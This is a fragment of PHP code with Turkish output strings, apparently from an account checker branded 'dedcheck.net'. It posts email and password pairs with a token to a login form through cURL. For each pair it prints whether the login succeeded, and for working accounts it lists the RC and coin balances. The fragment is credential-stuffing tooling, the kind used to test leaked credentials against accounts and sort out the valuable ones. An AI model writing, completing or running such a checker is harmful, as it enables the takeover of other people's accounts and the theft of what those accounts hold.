...
CURLOPT_COOKIEJAR => getcwd().'/cerez.txt',
CURLOPT_COOKIEFILE => getcwd().'/cerez.txt',
CURLOPT_POSTFIELDS => 'value='.$email.'&password='.$pass.'&token='.$tokenxD.''
));
$fim = curl_exec($ch);
...
echo "<b>✅ Giriş Başarılı</b> - $email : $pass - <b>Mevcut RC:</b> $mevcutrc - <b>Mevcut Coin:</b> $mevcutcoin - <b>www.dedcheck.net</b>";

}else{

echo "<b>❌ Giriş Başarısız</b> - $email : $pass - $logindurum - <b>www.dedcheck.net</b> <br>";
